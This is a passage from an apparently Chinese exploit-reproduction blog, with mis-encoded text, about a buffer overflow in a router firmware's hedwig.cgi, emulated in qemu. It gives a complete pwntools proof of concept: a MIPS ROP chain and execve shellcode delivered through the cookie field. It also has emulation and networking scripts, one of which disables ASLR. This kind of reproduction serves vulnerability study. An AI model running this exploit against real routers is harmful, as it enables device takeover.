\</span></span><br><span class="line"><span class="string">    -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \</span></span><br><span class="line"><span class="string">    -E HTTP_COOKIE=\&quot;&quot;&quot;&quot;</span> + payload + <span class="string">b&quot;&quot;&quot;\&quot; \</span></span><br><span class="line"><span class="string">    -E REQUEST_URI=&quot;2333&quot; \</span></span><br><span class="line"><span class="string">    ./htdocs/cgibin  </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>, shell = <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">io.send(post_content)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>çœ‹äº†winmtå¸ˆå‚…çš„åšå®¢è¯´æ˜¯ç”¨æˆ·æ¨¡å¼è¯¥æ–¹æ³•æ‰“ä¸é€šçš„åŸå› æ˜¯ï¼šè¿™é‡Œçš„<code>system</code>å‡½æ•°ä¸­æœ‰è°ƒç”¨<code>fork()</code>å‡½æ•°ï¼Œè€Œç”¨æˆ·æ¨¡å¼æ˜¯ä¸æ”¯æŒå¤šçº¿ç¨‹çš„ï¼Œè¿™é‡Œ<code>fork()</code>çš„å¤±è´¥ï¼Œä¼šå¯¼è‡´åé¢<code>$fp</code>æ˜¯ä¸ªç©ºæŒ‡é’ˆï¼Œå°±ä¼šå‡ºé”™ï¼Œä¹‹ååœ¨ç³»ç»Ÿæ¨¡å¼æ‰“å°±ä¸ä¼šå‡ºé—®é¢˜äº†ã€‚</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223743.png" alt="image-20240423211312592" style="zoom:50%;" /><p>è¿™é‡Œå°±å‡ºé—®é¢˜äº†</p><h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>åˆ°è¿™é‡Œéœ€è¦å¸ƒç½®shellcodeé“¾ï¼Œè¿™ç§åšæ³•å°±ä¸ä¼šå¯¼è‡´systemä¸­çš„forkä½¿å¾—æ‰“ä¸é€šï¼Œå› ä¸ºæ˜¯ç›´æ¥è°ƒç”¨execveï¼Œè€Œå› ä¸ºsprintfçš„0æˆªæ–­ï¼Œå› æ­¤shellé‡Œä¸èƒ½å‡ºç°\x00ï¼Œè¿˜è¦æ³¨æ„ä¸èƒ½å‡ºç°ç¼“å­˜ä¸ä¸€è‡´æ€§ï¼ˆéœ€è¦ä¸€ä¸ªæ—¶é—´æ¥åŒæ­¥ï¼‰ï¼Œå› æ­¤å…ˆè°ƒç”¨ä¸€ä¸‹sleep(1)ï¼Œå†å»æ‰§è¡Œshellcode</p><p>è¿™é‡Œè¿˜éœ€è¦æåˆ°ä¸€ä¸ªç‚¹ï¼Œå› æ­¤è°ƒç”¨çš„sleepå‡½æ•°ï¼Œä»–çš„æ ˆä¼šå¾€ä¸‹ç§»ï¼Œå› æ­¤raå’Œså¯„å­˜å™¨çš„å€¼æ‰€åœ¨çš„ä½ç½®ä¼šä¸ä¸€æ ·ï¼Œæˆ‘æ˜¯é€šè¿‡è°ƒè¯•ç¡®å®šçš„ï¼Œå…ˆè°ƒè¯•ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223744.png" alt="22e0c1e77961f170faf679ff4d9a3c0a"></p><p>è¿™æ˜¯å…ˆå€Ÿç”¨winmtå¸ˆå‚…çš„pocï¼Œè¿™æ˜¯åˆ°è¾¾sleepå‡½æ•°çš„æ ˆä½ç½®å¯ä»¥çœ‹åˆ°è°ƒç”¨sleepçš„åœ°å€-04cä¸raæ‰€åœ¨çš„åœ°å€-004ç›¸å·®äº†0x48ï¼Œå³18ä¸ªåœ°å€é•¿åº¦ï¼Œç¬¬18ä¸ªåœ°å€å°±æ˜¯raäº†ï¼Œå†çœ‹sleepçš„æºç å‰é¢éƒ¨åˆ†ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223745.png" alt="image-20240424191520351"></p><p>å‘ç°åªæœ‰s4-s0ï¼Œå› æ­¤å¯ä»¥ä»¥æ­¤æ„é€ ROPé“¾ï¼Œè·³åˆ°shellcodeï¼Œå®ç°ret2shellcode</p><p>åœ¨æ„é€ ROPé“¾çš„æ—¶å€™è¿˜é‡åˆ°äº†å¾ˆå¤šé—®é¢˜ï¼Œåœ¨jalråˆ°sleepå‡½æ•°çš„æ—¶å€™ï¼Œå»ºè®®é—´æ¥è·³è½¬ï¼Œå› ä¸ºåœ¨sleepå‡½æ•°ä¸­ä¼šè°ƒç”¨å„ç§å¯„å­˜å™¨ï¼Œå–åœ°å€ä¸Šçš„å€¼æ—¶å¿…é¡»ä¿è¯å¯„å­˜å™¨ä¸ºæœ‰æ•ˆæ•°ï¼Œè€Œé€šè¿‡é—´æ¥è·³è½¬æ—¶ï¼Œä¾‹å¦‚åœ¨è·³è½¬å’Œsleepä¸­é—´å†å¤šåŠ ä¸€æ¡é“¾ï¼Œè¿™æ ·ç›¸å½“äºé‡ç½®å¯„å­˜å™¨ï¼Œå› ä¸ºæœ‰äº›å¯„å­˜å™¨ä¾‹å¦‚gpä¸ä¼šä¿å­˜å°±ä¼šä¸€ç›´ä½¿ç”¨ç­‰ç­‰</p><p>pocï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;mips&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#prepare</span></span><br><span class="line"><span class="comment">#0x00057E50  |  li $a0,1                   |  jalr  $s1 </span></span><br><span class="line"><span class="comment">#0x00013F74  |  addiu $s1,$sp,0x28+var_10  |  jalr  $s4 </span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">libc_base = <span class="number">0x7F738000</span></span><br><span class="line"> </span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x3cd</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span>              <span class="comment">#s0</span></span><br><span class="line">payload+=p32(libc_base + <span class="number">0x436D0</span>) <span class="comment">#s1  move $t9, $s3 (=&gt; lw... =&gt; jalr $t9)</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span>              <span class="comment">#s2</span></span><br><span class="line">payload+=p32(libc_base + <span class="number">0x56BD0</span>) <span class="comment">#s3  sleep</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span>              <span class="comment">#s4</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span>              <span class="comment">#s5</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span>              <span class="comment">#s6</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span>              <span class="comment">#s7</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span>              <span class="comment">#s8</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x57E50</span>) <span class="comment">#ra  li $a0,1 | jalr  $s1</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span>            <span class="comment">#s0</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span>            <span class="comment">#s1</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span>            <span class="comment">#s2</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span>            <span class="comment">#s3</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x57E50</span>) <span class="comment">#s4  li $a0,1 | jalr  $s1</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x13F74</span>) <span class="comment">#second ra addiu $s1,$sp,0x28+var_10  |  jalr  $s4</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    slti $a2, $zero, -1</span></span><br><span class="line"><span class="string">    li $t7, 0x69622f2f</span></span><br><span class="line"><span class="string">    sw $t7, -12($sp)</span></span><br><span class="line"><span class="string">    li $t6, 0x68732f6e</span></span><br><span class="line"><span class="string">    sw $t6, -8($sp)</span></span><br><span class="line"><span class="string">    sw $zero, -4($sp)</span></span><br><span class="line"><span class="string">    la $a0, -12($sp)</span></span><br><span class="line"><span class="string">    slti $a1, $zero, -1</span></span><br><span class="line"><span class="string">    li $v0, 4011</span></span><br><span class="line"><span class="string">    syscall 0x40404</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">post_content=<span class="string">&#x27;s1nec-1o=pwner&#x27;</span></span><br><span class="line">payload+=<span class="number">0x18</span>*<span class="string">b&#x27;A&#x27;</span></span><br><span class="line">payload+=shellcode</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;uid=&#x27;</span>+payload</span><br><span class="line">io = process(<span class="string">b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    qemu-mipsel -L ./ \</span></span><br><span class="line"><span class="string">    -0 &quot;hedwig.cgi&quot; \</span></span><br><span class="line"><span class="string">    -E REQUEST_METHOD=&quot;POST&quot; \</span></span><br><span class="line"><span class="string">    -E CONTENT_LENGTH=11 \</span></span><br><span class="line"><span class="string">    -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \</span></span><br><span class="line"><span class="string">    -E HTTP_COOKIE=\&quot;&quot;&quot;&quot;</span> + payload + <span class="string">b&quot;&quot;&quot;\&quot; \</span></span><br><span class="line"><span class="string">    -E REQUEST_URI=&quot;2333&quot; \</span></span><br><span class="line"><span class="string">    ./htdocs/cgibin</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>, shell = <span class="literal">True</span>)</span><br><span class="line">io.send(post_content)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å°±æˆåŠŸgetshelläº†</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223746.png" alt="image-20240424195751503" style="zoom:50%;" /><p>ä½†æ˜¯ZIKH26å¸ˆå‚…ï¼šè¿™é‡Œæ‰§è¡Œ <code>execve(&quot;/bin/sh&quot;)</code> æˆåŠŸå…¶å®æ˜¯ä¸€ç§å‡è±¡ï¼Œå› ä¸ºå›ºä»¶ä¸­çš„ <code>/bin/sh</code> é“¾æ¥åˆ°äº† <code>busybox</code> ä¸Šï¼Œè™½ç„¶ <code>busybox</code> æ˜¯é™æ€é“¾æ¥ï¼Œä½†å› ä¸ºå®ƒæ˜¯ <code>MIPS</code> æ¶æ„ï¼Œå¯¼è‡´äº†æˆ‘åœ¨ <code>x64</code> ä¸Šç›´æ¥æ‰§è¡Œæ˜¯å¤±è´¥çš„ã€‚å› æ­¤æˆ‘ä¸Šé¢æ˜¯æŠŠåŸæœ¬çš„ <code>sh</code> ç»™åˆ æ‰ï¼Œæ¢æˆäº†ä¸»æœºè‡ªå¸¦çš„ <code>x64</code> æ¶æ„çš„ <code>sh</code> ï¼ŒåŒæ—¶è¿˜æŠŠç›¸åº”çš„åŠ¨æ€åº“éƒ½æ”¾åˆ°äº†å½“å‰çš„ <code>/lib</code> ä¸‹é¢ï¼Œæ‰ç®—æ‰§è¡ŒæˆåŠŸã€‚ä¸ç„¶ç”¨åŸæœ¬çš„ <code>sh</code> è¿˜æ˜¯æ‰§è¡Œå¤±è´¥ï¼Œè¿™ä¹ˆåšçš„ç›®çš„ä»…ä»…æ˜¯ä¸ºäº†è¯æ˜è¿™ç§æ“ä½œç†è®ºä¸Šæ˜¯å¯ä»¥æ‹¿åˆ° <code>shell</code> çš„</p><h2 id="qemuç³»ç»Ÿæ¨¡å¼å¤ç°"><a href="#qemuç³»ç»Ÿæ¨¡å¼å¤ç°" class="headerlink" title="qemuç³»ç»Ÿæ¨¡å¼å¤ç°"></a>qemuç³»ç»Ÿæ¨¡å¼å¤ç°</h2><h3 id="å®ç°å®¿ä¸»æœºä¸-qemu-çš„é€šä¿¡"><a href="#å®ç°å®¿ä¸»æœºä¸-qemu-çš„é€šä¿¡" class="headerlink" title="å®ç°å®¿ä¸»æœºä¸ qemu çš„é€šä¿¡"></a>å®ç°å®¿ä¸»æœºä¸ <code>qemu</code> çš„é€šä¿¡</h3><p>åˆ›å»ºä¸€ä¸ª <code>net.sh</code> è„šæœ¬ï¼Œæˆ‘è¿™é‡Œçš„ç½‘å¡æ˜¯ <code>ens33</code> ï¼Œå¦‚æœæ˜¯ <code>eth0</code> çš„è¯ï¼Œå°±æŠŠå‡ºç°çš„ <code>ens33</code> æ¢æˆ <code>eth0</code> å³å¯ï¼Œ<code>chmod +x net.sh</code> ç»™æ–‡ä»¶å¯æ‰§è¡Œæƒé™ï¼Œç„¶å <code>./net.sh</code> è¿è¡Œ</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment">#sudo ifconfig eth0 down                 # é¦–å…ˆå…³é—­å®¿ä¸»æœºç½‘å¡æ¥å£</span></span><br><span class="line">sudo brctl addbr br0                     <span class="comment"># æ·»åŠ ä¸€åº§åä¸º br0 çš„ç½‘æ¡¥</span></span><br><span class="line">sudo brctl addif br0 ens33                <span class="comment"># åœ¨ br0 ä¸­æ·»åŠ ä¸€ä¸ªæ¥å£</span></span><br><span class="line">sudo brctl stp br0 off                   <span class="comment"># å¦‚æœåªæœ‰ä¸€ä¸ªç½‘æ¡¥ï¼Œåˆ™å…³é—­ç”Ÿæˆæ ‘åè®®</span></span><br><span class="line">sudo brctl setfd br0 1                   <span class="comment"># è®¾ç½® br0 çš„è½¬å‘å»¶è¿Ÿ</span></span><br><span class="line">sudo brctl sethello br0 1                <span class="comment"># è®¾ç½® br0 çš„ hello æ—¶é—´</span></span><br><span class="line">sudo ifconfig br0 0.0.0.0 promisc up     <span class="comment"># å¯ç”¨ br0 æ¥å£</span></span><br><span class="line">sudo ifconfig ens33 0.0.0.0 promisc up    <span class="comment"># å¯ç”¨ç½‘å¡æ¥å£</span></span><br><span class="line">sudo dhclient br0                        <span class="comment"># ä» dhcp æœåŠ¡å™¨è·å¾— br0 çš„ IP åœ°å€</span></span><br><span class="line">sudo brctl show br0                      <span class="comment"># æŸ¥çœ‹è™šæ‹Ÿç½‘æ¡¥åˆ—è¡¨</span></span><br><span class="line">sudo brctl showstp br0                   <span class="comment"># æŸ¥çœ‹ br0 çš„å„æ¥å£ä¿¡æ¯</span></span><br></pre></td></tr></table></figure><p>ç„¶åå†æ‰§è¡Œå¦‚ä¸‹å‡ æ¡å‘½ä»¤</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">sudo tunctl -t tap0 -u root              <span class="comment"># åˆ›å»ºä¸€ä¸ª tap0 æ¥å£ï¼Œåªå…è®¸ root ç”¨æˆ·è®¿é—®</span></span><br><span class="line">sudo brctl addif br0 tap0                <span class="comment"># åœ¨è™šæ‹Ÿç½‘æ¡¥ä¸­å¢åŠ ä¸€ä¸ª tap0 æ¥å£</span></span><br><span class="line">sudo ifconfig tap0 0.0.0.0 promisc up    <span class="comment"># å¯ç”¨ tap0 æ¥å£</span></span><br><span class="line">sudo brctl showstp br0</span><br></pre></td></tr></table></figure><p>å†ç”¨ä¸‹é¢è¿™ä¸ªè„šæœ¬å¯åŠ¨</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-mipsel -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mipsel_standard.qcow2 -append <span class="string">&quot;root=/dev/sda1 console=tty0&quot;</span> -nographic -net nic -net tap,ifname=tap0,script=no,downscript=no</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç³»ç»Ÿçš„é“¾æ¥æ˜¯ZIKH26å¸ˆå‚…çš„é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1-qvt7pG0Tr91JKoH2elNdQ?pwd=l04v%E6%8F%90%E5%8F%96%E7%A0%81%EF%BC%9Al04v">https://pan.baidu.com/s/1-qvt7pG0Tr91JKoH2elNdQ?pwd=l04væå–ç ï¼šl04v</a></p><p>ç¡®ä¿æ­¤æ—¶çš„ç³»ç»Ÿå¯ä»¥pingé€šç‰©ç†æœºï¼Œä»¥ä¾¿ä¹‹åçš„ä¼ è¾“æ–‡ä»¶</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223747.png" alt="image-20240425215309877" style="zoom: 50%;" /><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223748.png" alt="image-20240425215157154" style="zoom:50%;" /><h4 id="å¯åŠ¨-httpd-æœåŠ¡"><a href="#å¯åŠ¨-httpd-æœåŠ¡" class="headerlink" title="å¯åŠ¨ httpd æœåŠ¡"></a>å¯åŠ¨ <code>httpd</code> æœåŠ¡</h4><p>åœ¨ <code>squashfs-root</code> çš„ä¸Šä¸€çº§ç›®å½•ä¸­ï¼Œæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼Œ <code>IP</code> æ¢æˆ <code>qemu</code> çš„ã€‚è¿™æ ·å¯ä»¥å®ç°è®¡ç®—æœºè¿œç¨‹ä¹‹é—´çš„æ–‡ä»¶ä¼ è¾“ï¼Œä½œç”¨å°±æ˜¯æŠŠæå–å‡ºæ¥çš„æ–‡ä»¶ç³»ç»Ÿä¼ åˆ° <code>qemu</code> é‡Œé¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo scp -r ./squashfs-root root@10.214.140.139:/root/squashfs-root</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨ <code>qemu</code> ä¸­çš„ <code>squashfs-root</code> ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ª <code>http_conf</code> æ–‡ä»¶</p><p>å†™å…¥ä»¥ä¸‹ä»£ç ï¼ˆç½‘å¡å’Œ <code>IP</code> <code>port</code> è¦æ”¹æˆè‡ªå·±çš„ï¼‰</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">Umask 026</span><br><span class="line">PIDFile /var/run/httpd.pid</span><br><span class="line">LogGMT On  <span class="comment">#å¼€å¯log</span></span><br><span class="line">ErrorLog /log <span class="comment">#logæ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line">Tuning</span><br><span class="line">&#123;</span><br><span class="line">    NumConnections 15</span><br><span class="line">    BufSize 12288</span><br><span class="line">    InputBufSize 4096</span><br><span class="line">    ScriptBufSize 4096</span><br><span class="line">    NumHeaders 100</span><br><span class="line">    Timeout 60</span><br><span class="line">    ScriptTimeout 60</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Control</span><br><span class="line">&#123;</span><br><span class="line">    Types</span><br><span class="line">    &#123;</span><br><span class="line">        text/html    &#123; html htm &#125;</span><br><span class="line">        text/xml    &#123; xml &#125;</span><br><span class="line">        text/plain    &#123; txt &#125;</span><br><span class="line">        image/gif    &#123; gif &#125;</span><br><span class="line">        image/jpeg    &#123; jpg &#125;</span><br><span class="line">        text/css    &#123; css &#125;</span><br><span class="line">        application/octet-stream &#123; * &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Specials</span><br><span class="line">    &#123;</span><br><span class="line">        Dump        &#123; /dump &#125;</span><br><span class="line">        CGI            &#123; cgi &#125;</span><br><span class="line">        Imagemap    &#123; map &#125;</span><br><span class="line">        Redirect    &#123; url &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    External</span><br><span class="line">    &#123;</span><br><span class="line">        /usr/sbin/phpcgi &#123; php &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Server</span><br><span class="line">&#123;</span><br><span class="line">    ServerName <span class="string">&quot;Linux, HTTP/1.1, &quot;</span></span><br><span class="line">    ServerId <span class="string">&quot;1234&quot;</span></span><br><span class="line">    Family inet</span><br><span class="line">    Interface eth0  <span class="comment">#å¯¹åº”qemuä»¿çœŸè·¯ç”±å™¨ç³»ç»Ÿçš„ç½‘å¡</span></span><br><span class="line">    Address 192.168.121.128 <span class="comment">#qemuä»¿çœŸè·¯ç”±å™¨ç³»ç»Ÿçš„IP</span></span><br><span class="line">    Port <span class="string">&quot;80&quot;</span> <span class="comment">#å¯¹åº”æœªè¢«ä½¿ç”¨çš„ç«¯å£</span></span><br><span class="line">    Virtual</span><br><span class="line">    &#123;</span><br><span class="line">        AnyHost</span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">            Alias /</span><br><span class="line">            Location /htdocs/web</span><br><span class="line">            IndexNames &#123; index.php &#125;</span><br><span class="line">            External</span><br><span class="line">            &#123;</span><br><span class="line">                /usr/sbin/phpcgi &#123; router_info.xml &#125;</span><br><span class="line">                /usr/sbin/phpcgi &#123; post_login.xml &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">            Alias /HNAP1</span><br><span class="line">            Location /htdocs/HNAP1</span><br><span class="line">            External</span><br><span class="line">            &#123;</span><br><span class="line">                /usr/sbin/hnap &#123; hnap &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            IndexNames &#123; index.hnap &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨ç‰©ç†æœºä¸Š <code>/opt/tools/mipsel</code> ç›®å½•ï¼ˆæ²¡æœ‰çš„è¯å°±è‡ªå·±åˆ›å»ºå§ï¼‰ä¸­æ–°å»º <code>init.sh</code> æ–‡ä»¶ï¼Œå†™å…¥å¦‚ä¸‹é…ç½®</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/sh</span></span><br><span class="line">sudo sysctl -w net.ipv4.ip_forward=1</span><br><span class="line">sudo iptables -F</span><br><span class="line">sudo iptables -X</span><br><span class="line">sudo iptables -t nat -F</span><br><span class="line">sudo iptables -t nat -X</span><br><span class="line">sudo iptables -t mangle -F</span><br><span class="line">sudo iptables -t mangle -X</span><br><span class="line">sudo iptables -P INPUT ACCEPT</span><br><span class="line">sudo iptables -P FORWARD ACCEPT</span><br><span class="line">sudo iptables -P OUTPUT ACCEPT</span><br><span class="line">sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span><br><span class="line">sudo iptables -I FORWARD 1 -i tap0 -j ACCEPT</span><br><span class="line">sudo iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br></pre></td></tr></table></figure><p>ç»™è¿™ä¸ª <code>init.sh</code> ï¼Œå¯æ‰§è¡Œæƒé™ï¼Œç„¶åå°†å…¶æ‰§è¡Œ</p><p>ç„¶ååœ¨ <code>qemu</code> ä¸­çš„ <code>squashfs-root</code> ç›®å½•ä¸‹åˆ›å»º <code>init.sh</code> æ–‡ä»¶ï¼Œå†™å…¥ä¸‹é¢çš„å†…å®¹ã€‚ç»™å¯æ‰§è¡Œæƒé™ï¼Œç„¶åæ‰§è¡Œ</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line"><span class="built_in">cp</span> http_conf /</span><br><span class="line"><span class="built_in">cp</span> sbin/httpd /</span><br><span class="line"><span class="built_in">cp</span> -rf htdocs/ /</span><br><span class="line"><span class="built_in">mkdir</span> /etc_bak</span><br><span class="line"><span class="built_in">cp</span> -r /etc /etc_bak</span><br><span class="line"><span class="built_in">rm</span> /etc/services</span><br><span class="line"><span class="built_in">cp</span> -rf etc/ /</span><br><span class="line"><span class="built_in">cp</span> lib/ld-uClibc-0.9.30.1.so  /lib/</span><br><span class="line"><span class="built_in">cp</span> lib/libcrypt-0.9.30.1.so  /lib/</span><br><span class="line"><span class="built_in">cp</span> lib/libc.so.0  /lib/</span><br><span class="line"><span class="built_in">cp</span> lib/libgcc_s.so.1  /lib/</span><br><span class="line"><span class="built_in">cp</span> lib/ld-uClibc.so.0  /lib/</span><br><span class="line"><span class="built_in">cp</span> lib/libcrypt.so.0  /lib/</span><br><span class="line"><span class="built_in">cp</span> lib/libgcc_s.so  /lib/</span><br><span class="line"><span class="built_in">cp</span> lib/libuClibc-0.9.30.1.so  /lib/</span><br><span class="line"><span 